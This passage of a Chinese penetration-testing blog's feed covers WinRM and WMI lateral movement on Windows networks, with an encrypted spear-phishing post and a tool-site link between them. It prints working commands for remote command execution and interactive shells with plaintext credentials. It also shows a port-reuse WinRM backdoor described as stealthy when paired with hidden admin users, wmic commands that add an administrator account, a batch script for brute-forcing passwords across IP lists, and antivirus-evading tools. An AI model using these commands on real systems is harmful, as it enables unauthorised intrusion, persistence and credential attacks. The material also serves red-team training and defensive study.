Kerberos = true</span><br><span class="line">        Negotiate = true</span><br><span class="line">        Certificate = true</span><br><span class="line">        CredSSP = false</span><br><span class="line">    DefaultPorts</span><br><span class="line">        HTTP = <span class="number">5985</span></span><br><span class="line">        HTTPS = <span class="number">5986</span></span><br><span class="line">    TrustedHosts = *</span><br></pre></td></tr></table></figure><h3 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;winrs <span class="literal">-r</span>:<span class="number">192.168</span>.<span class="number">86.114</span> <span class="literal">-u</span>:<span class="number">192.168</span>.<span class="number">86.114</span>\administrator <span class="literal">-p</span>:<span class="number">123456</span>!<span class="selector-tag">@</span><span class="comment">#$% whoami</span></span><br><span class="line">win<span class="literal">-win7</span>\administrator</span><br></pre></td></tr></table></figure><h3 id="获取交互式的shell"><a href="#获取交互式的shell" class="headerlink" title="获取交互式的shell"></a>获取交互式的shell</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;winrs <span class="literal">-r</span>:<span class="number">192.168</span>.<span class="number">86.114</span> <span class="literal">-u</span>:<span class="number">192.168</span>.<span class="number">86.114</span>\administrator <span class="literal">-p</span>:<span class="number">123456</span>!<span class="selector-tag">@</span><span class="comment">#$% cmd</span></span><br><span class="line">Microsoft Windows [版本 <span class="number">6.1</span><span class="type">.7601</span>]</span><br><span class="line">版权所有 (c) <span class="number">2009</span> Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP 配置</span><br><span class="line"></span><br><span class="line">以太网适配器 本地连接:</span><br><span class="line"></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::<span class="number">95</span>c8:a481:b587:<span class="number">2</span>d7c%<span class="number">11</span></span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : <span class="number">192.168</span>.<span class="number">86.114</span></span><br><span class="line">   子网掩码  . . . . . . . . . . . . : <span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">   默认网关. . . . . . . . . . . . . : <span class="number">192.168</span>.<span class="number">86.1</span></span><br><span class="line"></span><br><span class="line">隧道适配器 isatap.&#123;<span class="number">993</span>CBC2D<span class="literal">-5164</span><span class="literal">-415A</span><span class="literal">-A70E</span><span class="literal">-00FF0F6119D5</span>&#125;:</span><br><span class="line"></span><br><span class="line">   媒体状态  . . . . . . . . . . . . : 媒体已断开</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br></pre></td></tr></table></figure><h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><h4 id="WSMan-WinRM"><a href="#WSMan-WinRM" class="headerlink" title="WSMan-WinRM"></a>WSMan-WinRM</h4><p> 使用WSMan.Automation COM对象通过WinRM执行远程命令。 </p><p> <a href="https://github.com/bohops/WSMan-WinRM">https://github.com/bohops/WSMan-WinRM</a> </p><h4 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h4><table><thead><tr><th align="left">模块功能</th><th align="left">目标端口</th><th align="left">目标系统</th><th align="left">使用教程</th></tr></thead><tbody><tr><td align="left">Winrm爆破</td><td align="left">5985/5986端口</td><td align="left">Windows</td><td align="left"><a href="http://k8gege.org/Ladon/WinrmScan.html">http://k8gege.org/Ladon/WinrmScan.html</a></td></tr></tbody></table><h2 id="其他利用"><a href="#其他利用" class="headerlink" title="其他利用"></a>其他利用</h2><h3 id="开启远程主机3389"><a href="#开启远程主机3389" class="headerlink" title="开启远程主机3389"></a>开启远程主机3389</h3><p>如果目标开启了WinRM可以利用<a href="https://github.com/Viralmaniar/PeekABoo">PeekABoo</a>工具使目标开启3389</p><h3 id="端口复用后门"><a href="#端口复用后门" class="headerlink" title="端口复用后门"></a>端口复用后门</h3><p>将WinRM监听端口由5985改为80或者443，即使端口被web服务也不影响，并且不影响web服务。利用如下</p><p>1）配置目标WinRM服务，更改监听端口开启复用</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm <span class="built_in">set</span> winrm/config/Listener?Address=*+Transport=HTTP <span class="selector-tag">@</span>&#123;Port=<span class="string">&quot;80&quot;</span>&#125;</span><br><span class="line">winrm <span class="built_in">set</span> winrm/config/service <span class="selector-tag">@</span>&#123;EnableCompatibilityHttpListener=<span class="string">&quot;true&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>2）链接目标</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs <span class="literal">-r</span>:<span class="number">192.168</span>.<span class="number">86.114</span> <span class="literal">-u</span>:<span class="number">192.168</span>.<span class="number">86.114</span>\administrator <span class="literal">-p</span>:<span class="number">123456</span>!<span class="selector-tag">@</span><span class="comment">#$% whoami</span></span><br></pre></td></tr></table></figure><p>该方法适用于有web服务的机器，不会开启新的端口，配合添加隐藏管理员用户，隐蔽性极高。</p><h2 id="参考引用："><a href="#参考引用：" class="headerlink" title="参考引用："></a>参考引用：</h2><p> <a href="http://t3ngyu.leanote.com/post/LM-WinRM-WinRS">http://t3ngyu.leanote.com/post/LM-WinRM-WinRS</a></p><p> <a href="https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/">https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/</a></p><p> <a href="https://xz.aliyun.com/t/6888">https://xz.aliyun.com/t/6888</a></p><p> <a href="https://www.cnblogs.com/-mo-/p/12019314.html">https://www.cnblogs.com/-mo-/p/12019314.html</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;基于winRM的横向移动&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="内网渗透" scheme="https://www.se7ensec.cn/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>在线肾透测试中心</title>
    <link href="https://www.se7ensec.cn/2020/08/24/%E8%82%BE%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83/"/>
    <id>https://www.se7ensec.cn/2020/08/24/%E8%82%BE%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83/</id>
    <published>2020-08-24T14:10:24.000Z</published>
    <updated>2020-11-14T19:55:25.730Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>“成就他人是一个伟大得行为，我将贯彻到底。”    ——hl0rey</p></blockquote><a id="more"></a><p>作为天天肾透，日日肾虚的我们，常常需要借助各种各样的在线网站来进行信息收集、加密解密、数据处理…</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.08.24/2.jpg"></p><p>随着浏览器收藏夹分类越来越多，找到网址然后打开得操作越来越觉得麻烦，便花了一些时间来整理了下做成了一个导航页，页面内容不定期会保持更新。</p><p>也不用担心某一类型重复得网站太多，不知道用哪个好，基本上贴上去得我自己全部都使用过，备注 ”推荐“ 的就是用起来感觉不错得。</p><p>个人认为通过在线网站各种功能，完成信息收集60%的工作是完全没问题的，希望可以对看文章的你有所帮助~</p><p>在线工具 - 肾透测试中心 -  <a href="https://gitbook.se7ensec.cn/">https://gitbook.se7ensec.cn/</a> </p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;“成就他人是一个伟大得行为，我将贯彻到底。”    ——hl0rey&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="HTML" scheme="https://www.se7ensec.cn/tags/HTML/"/>
    
  </entry>
  
  <entry>
    <title>鱼叉攻击|使用Lnk文件的另类钓鱼方式</title>
    <link href="https://www.se7ensec.cn/2020/08/22/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB-Lnk%E6%96%87%E4%BB%B6%E7%9A%84%E5%8F%A6%E7%B1%BB%E9%92%93%E9%B1%BC%E6%96%B9%E5%BC%8F/"/>
    <id>https://www.se7ensec.cn/2020/08/22/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB-Lnk%E6%96%87%E4%BB%B6%E7%9A%84%E5%8F%A6%E7%B1%BB%E9%92%93%E9%B1%BC%E6%96%B9%E5%BC%8F/</id>
    <published>2020-08-22T07:10:24.000Z</published>
    <updated>2020-11-14T19:55:57.388Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="b2380840d3793d67b6d9fc04edcfc8d634b1b333d73b8018b76fc3a2791f250b">60a13925d46354e3c1b9aa984b9eaf9066ac7a8ed9b3f8311475aa9b656c0c6cb67fd62584250b5f70e1534e6acd923ed400d8b00febcb6e2af442161de0bfabb7b7a22e8c3d9161dd7027da92ac92fe223b1deb3d800d6d4bec059945898427bf7de58ea0c39595e0ee422c22019309ca3ea54fe9fb113d930f6b0b150249fecb94cb26c74df089102e8c7a3bb8f2dab2c9b01f64c7c394f1e8e377ad2401f86cef116145507c114bb964bc800a340dac05a8b60241783abafcad6737b8f88a55fdd09f4083a05e06df1f0cf8b8c630a63bb7f75ca3df6756f81c889af656bb77856417d7eeea7d73e4fde9414b0353960e0c16fad44752fbe22830cab8aafd510c40b58c233a8ba23f59612192e9c6491721c9c62595662bfd4796dac9abebf7cb19435a7ef6b40fec6eee85c67faf8d3f271efe9a7ef0ce4ccc344a61163bdca2aaba2e895d527fa0978901170d648b1f450f50b25d603f002aeece4be97588a2932879c85e0325690e08bb63add5e1b20049493071cfe90bcf14d13f875c18fab445603380958fb2f376317ad69c6fd4cbc9d33afa7412e63946a495cdf7a417b1990d246e054d278d24c5153f51ff970731b65b4b689410f580570f9f8e3a9f73bec92c0b70bcd49f4433c1e06bd7e5e4edd0c58cf7841682a7ff5111fcbc0a56f67d879229a682b8b60f8bcec11372b169e616c482f079994f53c7b8788677fb1722aa5bb1c698250585031b0c5caa312f98fce68268e563e7de65ad9a79982a94c41fea9289c93766d44d281b428fc45ced665f4a4323d2f733c9072259f06d614074f5876bd73d0b1624420c60ef7686dc02553d1b2c5e18ace329318fceb78d3bc49cbcab3f19949a805e4640ad45f828340e02e697120ffd22c8f92701e654fd33f7a1a111947f18dc5469498fdde9302640c85d3584dbcfc505d5605b766ac57a4c3be045f7ff78194d3cfa69c3be4f48d61840c226451cf7aaa3d3ec02b11a63f8a996658968e399e0e98da2afedb7e0d98719fd4a55e415c99f14b95c172e4dd2fa6656bef00a60bba994f72b5dc5dbac6be7627a740a1f8e713adf9f7ae230fe7ef44b4c27b7ac2553847682d5f7ad5bdd913b1302fe5d15880e789624bfb096f457f01033878ff595c15eaf88c215dd0130023687ae4ae0eace0dfb0ab731a310624b1bd92953fa7f171ff0dd69b26ff31cbaddbaddd3a6f85e63d0c7480e2682da9ef12d87dfa5558358e86d542c62372bdd8b324549a7f432838112e9e1447f3226c6b40b6dd0df179bc480f9d27a95b7e38627d2746160883a4b8a04542491e52b1875a8e71de625d64ccf39cf7100950f1c71caad7a05ada2252bc0beedb270c445308395158317b5b40d71d68c9435a33b64a7b8adddb471a0db5ead48e605630f2d9e10a43b22b61e5ebba00803e8c6473f7cb920af85ffd8a0c1cb55128c2fe6b1d6d3a38eca07650cc00ceebfcd8001177d5b6385e2ffb272faea39b74045025eee12464a925e32d01a2f52cd9aba5c7e75f4b5b0df5a8e5509f2ef01aef1b4573b2526935ed1b75a0764f81bf3d5fc24732d085b93b0a4e4949ecbb86963e7a9d1fa3ba6065caa79f871fa8ce363cffbd92942cb5406fd60a5d6b27e0d5d8140fc153b0e04669ad14ebbf773ddddf23e15193d3090552c0331de91b1651c1a84d3b6c7b1be4aa4b8fe1a283550dccbbd2b8d29e19c02434a0f3fbe53754292635b4ba08f0615721f131dbbfd30850692c0d6680271a3a0e42fa21113dc21d76950b0e5d41182849449621821cd74ed34ca3889dae7ba682405f88fd5f931627e72d37a56ab7cfcdf53d4e00d5341604f1651ae147ee82be71eaa6a387a3f82920d57c1c9b2aa9cd89ab14ae23e6e7cc8bf68827ae4d1e52d51f1a610df11f39ee5a10029394163320310826b229b6f42dacbfa5c515c359681d79d3c7f060d6cfc65c3b2ffd315d9a77a200f476502b70901d88a293b0bb7d9151e8bc41d3afe32bb11865d0099cf62f6bde2faef2c566a6b944fa7bb19563237ef552bded9b25293b154d0cab21d761bd6c293718183bb4b7f73c349bb8aa1674b7ab5777ea7a7d79fab879052ecf2e481bbe2a2fade9de7acb162067538c2b843d926a78aa4c18150c8b1ebfe7d832426ad2e4ed2338c1e58a544bb3a53e4398bb2d0553e145700e2784781fbc0c527754d3ae4ea98620af6e11be7cd79af2937eb647bc2cf6870e29886772e020eb386c3d073351b503066ce0c364bed838e23f9e22ee99896c3ab9bbd7850dc4261709dbec9f6076f74b294d01e2a6b8f4e7e420d4689354459eef7fc9195b664ce687b8bcd7d106973f8e4cc3c937401dd4780a1c7592cd5da9a096eabe4fada8a61760bf7b7b7bc05f7829f07a075a092a3ddc6955ff239d45514ecbceea1d2f469f038d317b03c860225daba43f9d451db8b3920923aa4cf7cf18358dfc1a2317ef6b575234feb2984cb776e68a19b7eb14de2ca26d7ed2152fb1bd56c76825335b5f9606448c959eaf095d391598ef85768f48f475682812ec8ea9a45c64c43da2fddf0b90d2927983ce66472777b94d79da54a0eba87b6157ba7971274662e3e1f3e40d825a46c92653e0ed0e84d90917770b3318635447c0e53114e5c098cd03d4ebe4026946055ddc5db3437da376cf443b2017666f70fed1a8635e1442fe40df2f23d7c70c38d597436a5c98207aff9395cb0150c419cd73e87e38126943e5b370d7ff638d447e30a1084e31dfb1419650428207321bc4669d524e6f41cea124805ec0cbfa06d97a3bd4dc3c92199d765cea6afc88b7adef161bb3dc21e44a97ba1a2d8dcf229431e3082e5d1bdd4492261babaf30a2d3c62a9e390fd3899bc2a2b4bf5be27118b6fe048e4e5199984ea033945ab9dc7e9fc3d710b936b8b47c643b8b84804b531a0ca58871d57e6aebc84c1d7cbf39c440c0d68d258dd81bc011221ed741d2a362b05c1c4479f6c67c959d2388925bab99fb52713ffaef078d7fdc9a72c83ac299679c42d3d2a9d0a65a7fd746a19b2e1145e5662e6e90e35c9f90470b4866098d17a4a68cb93848f7dc56624a550e63c011c79b37f3a7e1172c59a1da9bbb2eda3d10e4043557cb5b159a78a6b2528f43ead9f78636982899146b59f7b4c42c9571dc25192d76dd5cee312937a18c560d0dbf0d53de90d08f533eca6a9b09d9e7ce8c75c666f7d7e4de9599d677bc8416b1e358ca6fc3813a7c0396cb4c7e1ba1fa0f50e58bd5fe56c5a39770355ac25718786c295205872cb1d2515727eef69b7e7444106dfb3cec58c62693720ba52b942079a8c9ce952904b4d9ea21345efe61866923b32e66f4192f30c68247c495cd3f383db0b6ec6f7b16f54eaa18174018e66ec1f3c5757d8df65f9074d3d099ffab1d764cb9c7b32002bbf2aba24e0a71024354dc4376a0cf4081e43387eaeb1ac312382f2cb01d1fa35368755db065fb72e2c739f65c512913661b09709bc90d19125a0bfc0af67517350babd0ee2efda3e4afdc833548885a1241f6a912dc402d519f25559a8ba011bc0a6290fd4e43d2c66e9181c49bef7022dae2f72b81a3f34bc5132624d48444940404af3aa3985262af54637aec2d8d29cb749cefb44f0a9f43a012caf75fc020fb9563ee3a36cbee6a0242d5c101a507ef336a59aec8bf7cbe0c3d7744ab36c4324bb8375555fa35274ff3083283d501ca2ae92d6a62d7a2474598d595e6fbe02fec66437f28ed038a0f99a4921fedc907e3fbe8bd60b54699b2d1c5504eec503c7bddd4233670ccf1b79d2e1bbe2d89f199e144e449fc32648537ad64dd26e7250daba3ef76e6e1fd078189ad1ddf695da380ab4d0a110e996a9e07182c960d1a1a58d47b3224f513bed8fbe5042200ad4566a3111f774795cbe11f66910b480c8e298e6f58db00ce240d08fbdaa3736b298d0c191783701fbfb4710eac46e3d5e387d1eea4b1d9e248aa1da93c5e1e7799776171ca851ab4a9c52ac9ec613fe6f5feec3e5a3b17240ba915ff4591d66719bbd202bfa0c4df6afb1a48fa3a837742b16416c511b4ad30aaa2fb86fc176b96da3723c56a70ffe01a8c6723afb14fd572a99e0d32208a50f030dd8cfcbe03e253794410e93228121724ec106e69e7fff49b750de8029939beb5dc41e54f5e739b69d63d4abff1337d58b81554a8438ec71a082b8c8e4208cc07500653b2d8f945e3602ea6d42ffd3bbdeae7f2a2aa67c69c99cf4f57fac05e5f3ec7c9ab436cd8367</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="鱼叉攻击" scheme="https://www.se7ensec.cn/tags/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透|基于WMI的横向移动</title>
    <link href="https://www.se7ensec.cn/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8Ewmi%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <id>https://www.se7ensec.cn/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8Ewmi%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</id>
    <published>2020-07-12T07:12:24.000Z</published>
    <updated>2020-11-14T19:55:04.354Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>基于WMI的横向移动</p></blockquote><a id="more"></a><h2 id="WMI-介绍"><a href="#WMI-介绍" class="headerlink" title="WMI 介绍"></a>WMI 介绍</h2><p><code>WMI </code>的全称是 <code>Windows Management Instrumentation</code>，它出现在所有的 <code>Windows</code>操作系统中，并由一组强大的工具集合组成，用于管理本地或远程的<code>Windows</code>系统，攻击者使用<code>wmi</code>来进行攻击，但 <code>Windows </code>系统默认不会在日志中记录这些操作，可以做到无日志，攻击脚本无需写入到磁盘，增加了隐蔽性。推荐使用<code>wmic</code>进行远程执行命令。 </p><h2 id="WMI-利用条件"><a href="#WMI-利用条件" class="headerlink" title="WMI 利用条件"></a>WMI 利用条件</h2><p> 远程服务器启动<code>Windows Management Instrumentation</code>服务（默认开启）</p><p> <code>135</code> 端口未被过滤 [<strong>默认配置下目标主机防火墙开启将无法连接</strong>]</p><h2 id="连接失败常见错误号："><a href="#连接失败常见错误号：" class="headerlink" title="连接失败常见错误号："></a>连接失败常见错误号：</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.开启防火墙时，允许共享例外</span><br><span class="line">错误:</span><br><span class="line">代码 = <span class="number">0</span>x800706ba</span><br><span class="line">说明 = RPC 服务器不可用。</span><br><span class="line">设备 = Win32</span><br><span class="line"><span class="number">2</span>.组策略阻止administraotr远程访问时</span><br><span class="line">错误:</span><br><span class="line">代码 = <span class="number">0</span>x80070005</span><br><span class="line">说明 = 拒绝访问。</span><br><span class="line">设备 = Win32</span><br><span class="line"><span class="number">3</span>.IP安全策略阻止<span class="number">135</span>时</span><br><span class="line">错误:</span><br><span class="line">代码 = <span class="number">0</span>x800706ba</span><br><span class="line">说明 = RPC 服务器不可用。</span><br><span class="line">设备 = Win32</span><br><span class="line"><span class="number">4</span>.禁用winmgmt服务时</span><br><span class="line">错误:</span><br><span class="line">代码 = <span class="number">0</span>x80070422</span><br><span class="line">说明 = 无法启动服务，原因可能是已被禁用或与其相关联的设备没有启动。</span><br><span class="line">设备 = Win32</span><br><span class="line"><span class="number">5</span>.拒绝wbem目录权限，无法使用wmic的</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h2 id="利用-wmic-进行横向移动"><a href="#利用-wmic-进行横向移动" class="headerlink" title="利用 wmic 进行横向移动"></a>利用 wmic 进行横向移动</h2><h3 id="常用系统自带命令"><a href="#常用系统自带命令" class="headerlink" title="常用系统自带命令"></a>常用系统自带命令</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.列出远程主机进程</span><br><span class="line">wmic /node:<span class="number">192.168</span>.<span class="number">1.1</span> /user:<span class="number">192.168</span>.<span class="number">1.1</span>\administrator /password:!<span class="selector-tag">@</span><span class="comment">#123QWE process list brief</span></span><br><span class="line"><span class="number">2</span>.在远程系统上执行bat脚本</span><br><span class="line">wmic /node:<span class="number">192.168</span>.<span class="number">1.1</span> /user:<span class="number">192.168</span>.<span class="number">1.1</span>\administrator /password:!<span class="selector-tag">@</span><span class="comment">#123QWE process call create c:\programdata\test.bat</span></span><br><span class="line"><span class="number">3</span>.在远程系统上执行单条命令</span><br><span class="line">wmic /node:<span class="number">192.168</span>.<span class="number">1.1</span> /user:<span class="number">192.168</span>.<span class="number">1.1</span>\administrator /password:!<span class="selector-tag">@</span><span class="comment">#123QWE process call create &quot;cmd.exe /c net user test1 !@#123QWE /add &amp;&amp; net localgroup administrators test1 /add</span></span><br><span class="line"></span><br><span class="line">引用自：https://www.cnblogs.com/<span class="number">0</span>xdd/p/<span class="number">11393392</span>.html</span><br></pre></td></tr></table></figure><h3 id="批量爆破"><a href="#批量爆破" class="headerlink" title="批量爆破"></a>批量爆破</h3><p>wmi的爆破经过实践，错误次数3次以上，360会拦截【无杀软时没有测试】，记录日志为远程rdp爆破，并暂时限制wmi的连接。</p><p>※以下为单密码爆破，有爆破多个密码爆破的需求的话，可以根据ipc横向移动那篇自行修改</p><p><strong>坑点：需注意特殊字符，如密码中有 <code>%</code> 需要用 <code>%</code> 来转义，例 ：<code>123#$%</code> 应转化为 <code>123#$%%</code></strong> </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">cls</span></span><br><span class="line"><span class="built_in">echo</span> Useage: %<span class="number">0</span> ip.txt</span><br><span class="line"><span class="keyword">for</span> /f %%i <span class="keyword">in</span> (%<span class="number">1</span>) <span class="keyword">do</span> (</span><br><span class="line"><span class="built_in">echo</span> wmic /node:%%i /user:<span class="string">&quot;%%i\administrator&quot;</span> /password:<span class="string">&quot;123456&quot;</span> <span class="keyword">process</span> list brief  &gt;&gt; log.txt</span><br><span class="line">wmic /node:%%i /user:<span class="string">&quot;%%i\administrator&quot;</span> /password:<span class="string">&quot;123456&quot;</span> <span class="keyword">process</span> list brief &gt;NUL <span class="number">2</span>&gt;NUL</span><br><span class="line"><span class="keyword">IF</span> errorlevel == <span class="number">0</span> (</span><br><span class="line"><span class="built_in">echo</span> success:%%i &gt;&gt; pic.txt</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">echo</span> <span class="keyword">end</span> &gt;&gt; end.txt</span><br></pre></td></tr></table></figure><h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><h4 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a>wmiexec.vbs</h4><p>没有使用过，暂未测试</p><p><code>wmiexec.vbs</code> 是为了解决<code>wmic</code>无法回显命令而开发的一个工具，原理就是把数据先存到一个临时文件中，在每次读取完执行结果后就自动删除。可以用来回显 ”执行命令的结果“ 和获取 ”半交互式的 shell“  。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript wmiexec.vbs &#x2F;cmd 192.168.1.1 administrator test@123 whoami</span><br></pre></td></tr></table></figure><h4 id="impacket-wmiexec"><a href="#impacket-wmiexec" class="headerlink" title="impacket-wmiexec"></a>impacket-wmiexec</h4><p>优点：支持pth</p><p>缺点：他的使用需要调用wmi服务，占用目标的445、135和另一个随机端口，而smbexec只使用445端口。</p><p>使用参考：2.（1）<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0/">https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0/</a> </p><h4 id="sharpwmi"><a href="#sharpwmi" class="headerlink" title="sharpwmi"></a>sharpwmi</h4><p>这是一个基于<code>135</code>端口来进行横向移动的工具，具有执行命令和上传文件功能，通过<code>wmi</code>来执行命令，通过调用来进行数据传输。<br>优点：只依赖<code>135</code>端口，不依赖<code>139</code>和<code>445</code>端口<br>缺点：目前只支持上传512kb以下的文件，因为重置每个值的长度不能超过512kb。执行命令和上传文件都依赖<strong>powershell(被360拦截了)</strong></p><p><a href="https://github.com/QAX-A-Team/sharpwmi">https://github.com/QAX-A-Team/sharpwmi</a></p><h4 id="WMIHACKER-推荐"><a href="#WMIHACKER-推荐" class="headerlink" title="WMIHACKER(推荐)"></a>WMIHACKER(推荐)</h4><p>免杀横向渗透远程命令执行，常见的<code>WMIEXEC</code>、<code>PSEXEC</code>执行命令是创建服务或调用<code>Win32_Process.create</code>执行命令，这些方式都已经被杀软100%拦截，通过改造出<code>WMIHACKER</code>免杀横向移动测试工具。(只依赖<code>135</code>端口，不依赖<code>139</code>和<code>445</code>端口)</p><p>重要：支持pth -&gt;  <a href="https://github.com/360-Linton-Lab/WMIHACKER/issues/1">https://github.com/360-Linton-Lab/WMIHACKER/issues/1</a> </p><p>主要功能：1、命令执行；2、文件上传；3、文件下载</p><p><a href="https://github.com/360-Linton-Lab/WMIHACKER">https://github.com/360-Linton-Lab/WMIHACKER</a></p><h4 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h4><table><thead><tr><th align="left">模块功能</th><th align="left">目标端口</th><th align="left">目标系统</th><th align="left">使用教程</th></tr></thead><tbody><tr><td align="left">WMI爆破</td><td align="left">135端口</td><td align="left">Windows</td><td align="left"><a href="http://k8gege.org/Ladon/WmiScan.html">http://k8gege.org/Ladon/WmiScan.html</a></td></tr><tr><td align="left">WMI-NtlmHash爆破</td><td align="left">135端口</td><td align="left">Windows</td><td align="left"><a href="http://k8gege.org/Ladon/WmiHashScan.html">http://k8gege.org/Ladon/WmiHashScan.html</a></td></tr></tbody></table><h4 id="Sharp-WMIExec"><a href="#Sharp-WMIExec" class="headerlink" title="Sharp-WMIExec"></a>Sharp-WMIExec</h4><p>没有使用过，暂未测试</p><p><a href="https://github.com/checkymander/Sharp-WMIExec">https://github.com/checkymander/Sharp-WMIExec</a> </p><h4 id="WMIcmd"><a href="#WMIcmd" class="headerlink" title="WMIcmd"></a>WMIcmd</h4><p>没有使用过，暂未测试</p><p><a href="https://github.com/nccgroup/WMIcmd">https://github.com/nccgroup/WMIcmd</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;基于WMI的横向移动&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="内网渗透" scheme="https://www.se7ensec.cn/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透|基于IPC的横向移动</title>
